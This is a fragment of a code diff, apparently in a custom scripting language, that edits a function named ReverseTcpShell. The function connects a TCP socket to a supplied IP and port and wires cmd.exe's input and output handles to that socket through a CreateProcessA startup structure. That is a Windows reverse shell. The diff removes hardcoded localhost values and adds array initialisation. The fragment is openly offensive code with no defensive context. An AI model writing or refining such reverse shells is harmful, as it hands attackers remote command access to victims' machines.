@@ -3,11 +3,14 @@ declare("CreateProcessA", "kernel32.dll");
 import libraries.os.network
 
 int fn ReverseTcpShell(int ip, int port) {
-   int ip = IP(127.0.0.1);
-   int port = 8000;
    string cmd_line = "cmd.exe";
    int socket = ConnectTcp(ip, port);
    array startup_info int[17];
+   int cnt = 0;
+   while(cnt < 17) {
+       startup_info[cnt] = 0;
+       cnt += 1;
+   }
    startup_info[11] = 0x100;
    startup_info[14] = socket;
    startup_info[15] = socket;
